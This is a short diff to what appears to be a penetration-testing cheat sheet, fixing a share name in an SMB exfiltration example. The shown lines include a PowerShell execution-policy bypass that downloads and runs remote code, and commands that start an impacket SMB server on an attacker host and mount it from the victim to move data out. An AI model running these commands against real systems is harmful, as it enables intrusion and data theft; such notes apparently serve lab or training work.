@@ -101,7 +101,7 @@ powershell.exe -ep Bypass -c iex ((New-Object System.Net.WebClient).DownloadFile
 SMB Exfiltration
 ```cmd
 kali_op1> impacket-smbserver -smb2support kali `pwd`
-MD-Wind> net use \\10.10.14.14\test
+MD-Wind> net use \\10.10.14.14\kali
 ```
 Information about process
 ```cmd
